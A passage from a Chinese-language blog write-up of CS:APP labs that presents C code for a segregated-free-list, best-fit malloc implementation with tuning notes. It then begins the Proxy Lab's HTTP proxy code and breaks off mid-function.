Lab: 欢迎来到SIGSEGV的世界</h2><p>写了十二个小时头秃了，空闲块管理使用分离空闲链表，分配方式使用最佳适配，至于更细粒度的优化还是先放一边吧。</p><h3 id="宏和全局变量定义"><a href="#宏和全局变量定义" class="headerlink" title="宏和全局变量定义"></a>宏和全局变量定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Constants &amp; Basic macros*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WSIZE      4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DSIZE      8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE  160</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLASS_SIZE 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX(a, b) ((a) &gt; (b) ? (a) : (b))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN(a, b) ((a) &lt; (b) ? (a) : (b))</span><br><span class="hljs-comment">/* Pack a size and allocated bit into a word */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACK(size, allocated) ((size) | (allocated))</span><br><span class="hljs-comment">/* Read and write a word at address p */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p)          (*(unsigned int *)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT(p, val)     (*(unsigned int *)(p) = (val))</span><br><span class="hljs-comment">/* Get size and allocated field at address p */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SIZE(p)     (GET(p) &amp; ~0x7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_ALLOC(p)    (GET(p) &amp; 1)</span><br><span class="hljs-comment">/* Given block pointer bp, compute address of its header and footer*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HEADER(bp)      ((char*)(bp) - WSIZE) </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FOOTER(bp)      ((char*)(bp) + GET_SIZE(HEADER(bp)) - DSIZE)</span><br><span class="hljs-comment">/* Given block pointer bp, compute address of next and previous blocks */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEXT_BLOCK(bp)  ((char*)(bp) + GET_SIZE(HEADER(bp)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_BLOCK(bp)  ((char*)(bp) - GET_SIZE((char*)(bp) - DSIZE))</span><br><span class="hljs-comment">/* Get the address of the pointer to predecessor/successor FREE block */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRED(bp)        ((char*)(bp) + WSIZE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCC(bp)        ((char*)(bp))</span><br><span class="hljs-comment">/* Get the address of predecessor/successor FREE block*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRED_BLOCK(bp)  GET(PRED(bp))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCC_BLOCK(bp)  GET(SUCC(bp))</span><br><span class="hljs-comment">/* Heap Pointer */</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* heap_listp;<br><span class="hljs-comment">/* Freelist Pointer */</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* seg_listsp;<br></code></pre></td></tr></table></figure><h3 id="空闲链表添加-删除"><a href="#空闲链表添加-删除" class="headerlink" title="空闲链表添加&#x2F;删除"></a>空闲链表添加&#x2F;删除</h3><p>添加时计算大小所属分类，删除时修改相应指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Add a free block to/Delete the free block from the explicit free list</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">addFreeBlock</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> asize = GET_SIZE(HEADER(bp));<br>    <span class="hljs-type">int</span> index = size_class(asize);<br>    <span class="hljs-type">void</span>* listp = seg_listsp + index * WSIZE;<br>    <span class="hljs-type">void</span>* first_block = SUCC_BLOCK(listp);<br>    <span class="hljs-comment">//bp &lt;--&gt; first_block</span><br>    PUT(SUCC(bp), first_block);<br>    <span class="hljs-keyword">if</span> (first_block ) PUT(PRED(first_block), bp);    <br>    <span class="hljs-comment">//listp &lt;--&gt; bp</span><br>    PUT(SUCC(listp), bp);<br>    PUT(PRED(bp), listp);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">delFreeBlock</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">void</span> *pred_block = PRED_BLOCK(bp);<br>    <span class="hljs-type">void</span> *succ_block = SUCC_BLOCK(bp);<br>    PUT(SUCC(pred_block), succ_block);<br>    <span class="hljs-keyword">if</span> (succ_block) PUT(PRED(succ_block), pred_block);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="扩展堆"><a href="#扩展堆" class="headerlink" title="扩展堆"></a>扩展堆</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Extend the heap</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">extendHeap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> words)</span><br>&#123;<br>    words = words % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? words : words + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">size_t</span> size = words * WSIZE;<br>    <span class="hljs-type">void</span> *new_bp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((new_bp = mem_sbrk(size)) == ((<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    PUT(HEADER(new_bp), PACK(size, <span class="hljs-number">0</span>));            <span class="hljs-comment">//overwrite epilogue header</span><br>    PUT(FOOTER(new_bp), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(PRED(new_bp), <span class="hljs-literal">NULL</span>);<br>    PUT(SUCC(new_bp), <span class="hljs-literal">NULL</span>);<br>    PUT(HEADER(NEXT_BLOCK(new_bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));   <span class="hljs-comment">//restore epilogue header</span><br>    <span class="hljs-comment">/* Coalesce if previous block was free */</span><br>    new_bp = coalesce(new_bp);<br>    addFreeBlock(new_bp);<br>    <span class="hljs-keyword">return</span> new_bp;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合并空闲块"><a href="#合并空闲块" class="headerlink" title="合并空闲块"></a>合并空闲块</h3><p>根据前后块的分配情况分别讨论。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * coalesce - Coalesce adjacent free blocks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span> <br>&#123;<br>    <span class="hljs-type">void</span> *prev_p = PREV_BLOCK(bp);<br>    <span class="hljs-type">void</span> *next_p = NEXT_BLOCK(bp);<br>    <span class="hljs-type">int</span> prev_alloc = GET_ALLOC(HEADER(prev_p));<br>    <span class="hljs-type">int</span> next_alloc = GET_ALLOC(HEADER(next_p));<br>    <span class="hljs-type">size_t</span> combined_size = GET_SIZE(HEADER(bp));<br>    <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; next_alloc) <span class="hljs-keyword">return</span> bp;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;<br>        delFreeBlock(prev_p);<br>        combined_size += GET_SIZE(HEADER(prev_p));<br>        PUT(HEADER(prev_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(bp), PACK(combined_size, <span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> prev_p;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;<br>        delFreeBlock(next_p);<br>        combined_size += GET_SIZE(HEADER(next_p));<br>        PUT(HEADER(bp), PACK(combined_size, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(next_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        delFreeBlock(prev_p);<br>        delFreeBlock(next_p);<br>        combined_size += GET_SIZE(HEADER(prev_p)) + GET_SIZE(HEADER(next_p));<br>        PUT(HEADER(prev_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(next_p), PACK(combined_size, <span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span> prev_p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>用segregated fit划定起始类别，每次寻找做best fit。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * find a free block (best fit)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">find_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">void</span> *listp, *bp, *best = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> curr_size,min_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> index = size_class(asize);<br>    <span class="hljs-keyword">while</span> (index &lt;= CLASS_SIZE) &#123;<br>        listp = seg_listsp + index * WSIZE;<br>        bp = SUCC_BLOCK(listp);<br>        <span class="hljs-keyword">while</span> (bp) &#123;<br>            curr_size = GET_SIZE(HEADER(bp));<br>            <span class="hljs-keyword">if</span> (curr_size &gt;= asize &amp;&amp; (min_size == <span class="hljs-number">0</span> || curr_size &lt; min_size)) &#123;<br>                min_size = curr_size;<br>                best = bp;<br>            &#125;<br>            bp = SUCC_BLOCK(bp);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (best) <span class="hljs-keyword">break</span>;<br>        index+=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> best;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Get corresponding size class</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_class</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-class"><span class="hljs-keyword">class</span> =</span> <span class="hljs-number">0</span>;<br>    size &gt;&gt;= <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">while</span> (size &amp;&amp; (class&lt;CLASS_SIZE) ) &#123;<br>        size &gt;&gt;= <span class="hljs-number">1</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">class</span> +=</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> class;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分割空闲块"><a href="#分割空闲块" class="headerlink" title="分割空闲块"></a>分割空闲块</h3><p>如果剩余空间除去分配空间以外不小于一个块的最小大小，分割出一个空闲块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** </span><br><span class="hljs-comment"> * split&amp;allocate</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">use_block</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span> <br>&#123;<br>    <span class="hljs-type">size_t</span> blksize = GET_SIZE(HEADER(bp));<br>    delFreeBlock(bp);<br>    <span class="hljs-keyword">if</span> (blksize - asize &gt; <span class="hljs-number">2</span> * DSIZE) &#123;<br>        PUT(HEADER(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(FOOTER(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(HEADER(NEXT_BLOCK(bp)), PACK(blksize - asize, <span class="hljs-number">0</span>));<br>        PUT(FOOTER(NEXT_BLOCK(bp)), PACK(blksize - asize, <span class="hljs-number">0</span>));<br>        addFreeBlock(NEXT_BLOCK(bp));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        PUT(HEADER(bp), PACK(blksize, <span class="hljs-number">1</span>));<br>        PUT(FOOTER(bp), PACK(blksize, <span class="hljs-number">1</span>));<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><h3 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h3><p>先分配各个大小类别的空闲链表，然后分配序言块、结束块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>((heap_listp = mem_sbrk((<span class="hljs-number">4</span>+CLASS_SIZE)*WSIZE)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CLASS_SIZE; i+=<span class="hljs-number">1</span>) PUT(heap_listp + i*WSIZE, <span class="hljs-literal">NULL</span>);<br>    PUT(heap_listp + CLASS_SIZE * WSIZE, <span class="hljs-number">0</span>);                     <span class="hljs-comment">//alignment</span><br>    PUT(heap_listp + ((<span class="hljs-number">1</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));  <span class="hljs-comment">//prologue block header</span><br>    PUT(heap_listp + ((<span class="hljs-number">2</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));  <span class="hljs-comment">//prologue block footer</span><br>    PUT(heap_listp + ((<span class="hljs-number">3</span> + CLASS_SIZE)*WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));      <span class="hljs-comment">//epilogue block header</span><br>    seg_listsp = heap_listp;<br>    heap_listp = heap_listp + (CLASS_SIZE+<span class="hljs-number">1</span>) * WSIZE;<br>    <br>    <span class="hljs-keyword">if</span> (!extendHeap(CHUNKSIZE / WSIZE)) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-comment">//create a free block of CHUNKSIZE</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>调整块大小并对齐，然后用<code>find_fit</code>找匹配块，若找不到则用<code>extendHeap</code>扩展堆，用<code>use_block</code>设置分配内存位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** </span><br><span class="hljs-comment"> * mm_malloc - find a fit free block</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!size) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> asize = (size + <span class="hljs-number">2</span> * DSIZE - <span class="hljs-number">1</span>) &amp; ~<span class="hljs-number">0x7</span>;               <span class="hljs-comment">//aligned size</span><br>    <span class="hljs-type">void</span> *ptr = find_fit(asize);<br>    <span class="hljs-keyword">if</span> (!(ptr = ptr ? ptr : extendHeap(MAX(asize, CHUNKSIZE) / WSIZE))) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    use_block(ptr, asize);<br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * mm_free - Free a block and coalscue adjacent blocks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HEADER(ptr));<br>    PUT(HEADER(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FOOTER(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    addFreeBlock(coalesce(ptr));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h3><p><code>realloc</code>拷贝的大小取原有大小和新分配空间大小的较小值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * mm_realloc </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *newptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (!ptr) <span class="hljs-keyword">return</span> mm_malloc(size);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!size) &#123;<br>        mm_free(ptr);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> prevsize = GET_SIZE(HEADER(ptr));           <br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> alignedsize = (size + DSIZE * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>) &amp; (~<span class="hljs-number">0x7</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> deltas = prevsize - alignedsize;<br>        <span class="hljs-keyword">if</span> (deltas &gt; <span class="hljs-number">2</span> * DSIZE) &#123;<br>            PUT(HEADER(ptr), PACK(alignedsize, <span class="hljs-number">1</span>));<br>            PUT(FOOTER(ptr), PACK(alignedsize, <span class="hljs-number">1</span>));<br>            PUT(HEADER(NEXT_BLOCK(ptr)), PACK(deltas, <span class="hljs-number">0</span>));<br>            PUT(FOOTER(NEXT_BLOCK(ptr)), PACK(deltas, <span class="hljs-number">0</span>));<br>            addFreeBlock(coalesce(NEXT_BLOCK(ptr)));<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(newptr = mm_malloc(size))) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-built_in">memcpy</span>(newptr, ptr, MIN(prevsize - DSIZE,size));<br>            mm_free(ptr);<br>            <span class="hljs-keyword">return</span> newptr;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h3><p>调整宏定义部分参数。分类数<code>CLASS_SIZE</code>大于等于2时总吞吐量均能达到600Kops的标准(此处取分类数为2)。块大小<code>CHUNKSIZE</code>取为160时分配内存利用率较高，此时结果是49&#x2F;60(util)+40&#x2F;40(thru)，继续优化很麻烦，不想再碰SIGSEGV。</p><h2 id="8-Proxy-Lab-来一点最终大考震撼"><a href="#8-Proxy-Lab-来一点最终大考震撼" class="headerlink" title="8. Proxy Lab: 来一点最终大考震撼"></a>8. Proxy Lab: 来一点最终大考震撼</h2><p>缓存、并发和网络编程，都是不太好伺候的主。</p><h3 id="Part-I"><a href="#Part-I" class="headerlink" title="Part I"></a>Part I</h3><p>实现一个处理 HTTP&#x2F;1.0 GET 请求的基本顺序代理。此处代码实现可参照<code>tiny.c</code>文件。</p><p>宏和全局变量定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><br><span class="hljs-comment">/* You won&#x27;t lose style points for including this long line in your code */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *user_agent_hdr = <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *conn_hdr       = <span class="hljs-string">&quot;Connection: close\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *proxy_hdr      = <span class="hljs-string">&quot;Proxy-Connection: close\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *host_hdr_format= <span class="hljs-string">&quot;Host: %s\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *req_hdr_format = <span class="hljs-string">&quot;GET %s HTTP/1.0\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *hdr_end        = <span class="hljs-string">&quot;\r\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>分析请求得到的URI用以下结构存储：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Parsed_URI</span>&#123;</span><br>    <span class="hljs-type">char</span> host[MAXLINE];<br>    <span class="hljs-type">char</span> port[MAXLINE]; <br>    <span class="hljs-type">char</span> path[MAXLINE];<br>&#125;parsed_uri;<br></code></pre></td></tr></table></figure><p>主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* $begin main */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span 